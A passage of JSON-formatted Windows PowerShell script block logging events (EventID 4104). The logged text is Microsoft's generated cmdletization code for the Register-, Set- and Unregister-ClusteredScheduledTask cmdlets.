$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Xml') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Xml')) {\r\n          [object]$__cmdletization_value = ${Xml}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n     ",
    "ScriptBlockId": "961cd978-8fb5-4f94-aae7-dbef6c97012a",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.010909Z"
    },
    "EventRecordID": 45,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-26A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 3,
    "MessageTotal": 5,
    "ScriptBlockText": "     [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Resource')) {\r\n          [object]$__cmdletization_value = ${Resource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByXml', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Register-ClusteredScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Set-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Params', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=2)]\r\n    [Parameter(ParameterSetName='Params', Position=5)]\r\n    [Parameter(ParameterSetName='Xml', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=1)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Xml},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Params') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]",
    "ScriptBlockId": "961cd978-8fb5-4f94-aae7-dbef6c97012a",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.010921Z"
    },
    "EventRecordID": 46,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-26A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 4,
    "MessageTotal": 5,
    "ScriptBlockText": "$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByParams', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Xml') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Xml')) {\r\n          [object]$__cmdletization_value = ${Xml}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByXml', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-ClusteredScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Unregister-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = 